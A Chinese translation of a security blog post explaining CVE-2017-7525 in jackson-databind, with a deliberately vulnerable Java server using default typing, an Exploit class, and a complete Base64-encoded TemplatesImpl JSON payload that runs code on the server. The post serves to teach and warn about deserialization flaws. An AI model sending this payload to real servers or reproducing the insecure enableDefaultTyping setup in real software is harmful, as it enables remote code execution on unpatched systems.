# 使用 JSON 在远程服务器上执行 Java 代码

> 原文：<https://dev.to/bbossola/execute-java-code-on-a-remote-server-using-json-2nod>

**摘要。**

利用普通 Java 库中的漏洞在远程服务器上远程执行 Java 代码并成功控制它的难度有多大？不多，真的。在本文中，我们将使用 [CVE-2017-7525](https://nvd.nist.gov/vuln/detail/CVE-2017-7525) 来演示如何做到这一点，这是 [jackson-databind](https://github.com/FasterXML/jackson-databind/issues/1599) 中一个众所周知的漏洞，这是一个广泛用于序列化和反序列化 JSON 的库，也是 [spring-boot](https://github.com/spring-projects/spring-boot) 堆栈的一部分。这里用到的所有代码都是 GitHub 上的[。](https://github.com/bbossola/vulnerability-java-samples)

**示例代码。**

众所周知，序列化和反序列化 JSON 消息的任务是一项非常常见的任务，尤其是在现代基于 REST 的微服务应用程序中:几乎每次调用 API 时，都会有一条 JSON 消息被发送到服务器，在 Java 对象中进行转换。由于 jackson-databind 中的[一系列反序列化漏洞](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)，当[多态类型处理](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)启用时，现在可以编写简单的攻击程序来访问未打补丁的服务器。

为了清楚地解释这些概念，我们在这里介绍一个简单的服务器，它用两个 REST APIs 处理产品，一个用来获取产品列表，另一个用来添加新产品。请注意，这只是一个样本:我们只是想为您提供一段简单易懂的代码，绝不是可以分类的(我们希望！)作为生产代码。

我们的[产品](https://github.com/bbossola/vulnerability-java-samples/blob/master/src/main/java/io/meterian/samples/jackson/Product.java)类的一个例子，它保存了一些基本的产品信息:

```
public class Product {

    private int id;
    private String name;
    private String description;
    private Object data; 

    protected Product() {
    }

    [...] 
```

我们的 [ProductDatabase](https://github.com/bbossola/vulnerability-java-samples/blob/master/src/main/java/io/meterian/samples/jackson/ProductsDatabase.java) 类，只是一个美化了的散列表

```
public class ProductsDatabase {

  private Map<String, Product> products = new HashMap<>();
  private AtomicInteger idGenerator = new AtomicInteger(0);

  public ProductsDatabase() {
     add(new Product(0,"apple", "Real apple from Italy", randomData()));
     add(new Product(0,"orange", "Real orange from Italy", randomData()));
     add(new Product(0,"kiwi", "Real kiwi from Italy", randomData()));
  }

  public Collection list() {
    return Collections.unmodifiableCollection(products.values());
  }

  public Product add(Product newProduct) {
    Integer newId = idGenerator.incrementAndGet();
    Product product = newProduct.duplicate(newId);
    products.put(newId.toString(), product);
    return product;
  }

  [...]
} 
```

我们的[简单服务器](https://github.com/bbossola/vulnerability-java-samples/blob/master/src/main/java/io/meterian/samples/jackson/Main.java)，用 [SparkJava](http://sparkjava.com/) :
写的

```
public class Main {

  private static ProductsDatabase products = new ProductsDatabase();
  private static ObjectMapper deserializer = new ObjectMapper().enableDefaultTyping();
  private static ObjectMapper serializer = new ObjectMapper();

  public static void main(String[] args) {

    port(8888);

    // GET list all products
    get("/products", (request, response) -> {
      Collection res = products.list();
      return serializer.writeValueAsString(res);
    });

    // POST add new product
    post("/products", (request, response) -> {
      Product received = deserializer.readValue(request.body(), Product.class);
      products.add(received);
      response.status(201);
    });
  }
  [...]
} 
```

您可以通过一个简单的 curl 调用将产品添加到数据库中，调用的 JSON 主体包含新产品数据:

```
curl -i -X POST -d '{"name":"melon","description":"Real melon from Italy", "data":["java.util.HashMap",{"cost":2,"color":"yellow"}]}' http://localhost:8888/products 
```

**利用漏洞。**

为了利用漏洞，我们需要一个载体。在这种情况下，我们决定使用 [Apache Xalan](https://xalan.apache.org/) ，这是一个通用的 XSLT 库[，也包含在 JDK](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerImpl.java#TransformerImpl) 中(在版本 8u45 之前，它可以用作 vector，与 Xalan 在这里的使用方式相同)。请注意，有许多其他选项可以作为攻击媒介，但为了简单起见，我们将在这里集中讨论一个非常具体的选项。

我们将使用 Xalan 中的一个特定类，它能够从 XML 中反序列化一个编码的类文件，并动态地创建这样一个类的实例:我们将创建一个 JSON 消息，它将包含我们的[漏洞利用类](https://github.com/bbossola/vulnerability-java-samples/blob/master/exploit/Exploit.java)的编码类这里:

```
public class Exploit extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

  public Exploit() throws Exception {
    System.err.println("Your server has been compromised!");
  }

  @Override
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
  }

  @Override
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
  }
} 
```

我们只需要将这个源代码编译成一个. class 文件，[用 Base64](https://github.com/bbossola/vulnerability-java-samples/blob/master/exploit/Encoder.java) 编码，准备好我们的[邪恶 JSON 消息](https://github.com/bbossola/vulnerability-java-samples/blob/master/curls/exploit.json) :

```
{
  "name": "fakeapple",
  "description": "Fake fruit from UK",
  "data": ["org.apache.xalan.xsltc.trax.TemplatesImpl",
  {
    "transletBytecodes" : [ "yv66vgAAADQALgcAAgEAB0V4cGxvaXQHAAQBAC9vcmcvYXBhY2hlL3hhbGFuL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEABjxpbml0PgEAAygpVgEACkV4Y2VwdGlvbnMHAAkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAEQ29kZQoAAwAMDAAFAAYJAA4AEAcADwEAEGphdmEvbGFuZy9TeXN0ZW0MABEAEgEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwgAFAEAIVlvdXIgc2VydmVyIGhhcyBiZWVuIGNvbXByb21pc2VkIQoAFgAYBwAXAQATamF2YS9pby9QcmludFN0cmVhbQwAGQAaAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMRXhwbG9pdDsBAAl0cmFuc2Zvcm0BAFAoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO1tMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAIgEAKG9yZy9hcGFjaGUveGFsYW4veHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEAHExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAMVtMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBACRMb3JnL2FwYWNoZS94bWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQAwTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEV4cGxvaXQuamF2YQAhAAEAAwAAAAAAAwABAAUABgACAAcAAAAEAAEACAAKAAAAOwACAAEAAAANKrcAC7IADRITtgAVsQAAAAIAGwAAAAoAAgAAAAgABAAJABwAAAAMAAEAAAANAB0AHgAAAAEAHwAgAAIABwAAAAQAAQAhAAoAAAA/AAAAAwAAAAGxAAAAAgAbAAAABgABAAAADQAcAAAAIAADAAAAAQAdAB4AAAAAAAEAIwAkAAEAAAABACUAJgACAAEAHwAnAAIABwAAAAQAAQAhAAoAAABJAAAABAAAAAGxAAAAAgAbAAAABgABAAAAEgAcAAAAKgAEAAAAAQAdAB4AAAAAAAEAIwAkAAEAAAABACgAKQACAAAAAQAqACsAAwABACwAAAACAC0=" ],
    "transletName": "oops!",
    "outputProperties": {}
   }
 } 
```

在将消息作为正常的“添加产品”请求发送到服务器[之后，编码的类将由 Xalan TemplatesImpl 类实例化，以便它填充 outputProperties 字段的值:当构造函数代码被执行时，邪恶的代码也被执行，服务器受到威胁。是的，你可能在服务器上有异常，但是已经太晚了。](https://github.com/bbossola/vulnerability-java-samples/blob/master/curls/exploit.sh)

**结论**

这只是目前可能利用各种开源库的公共漏洞的数百种攻击中的一个例子，因此，在构建管道中添加一个能够检测并在检测到这种情况时阻止构建的扫描器是非常重要的。我们诚挚地邀请您使用我们在 meterian.io 上提供的简单命令行客户端，以避免未来令人讨厌的意外。你不想成为下一个 Equifax 。

你可以打 [meterian.io](//mailto:bruno@meterian.io) 找到我！

免责声明:请注意，所有这些信息在互联网上都是公开的。这只是一个网络安全从业者的总结帖子，仅此而已。提供的代码仅用于研究目的。本作品受[知识共享署名-非商业性使用 4.0 国际许可](https://creativecommons.org/licenses/by-nc/4.0/)的许可。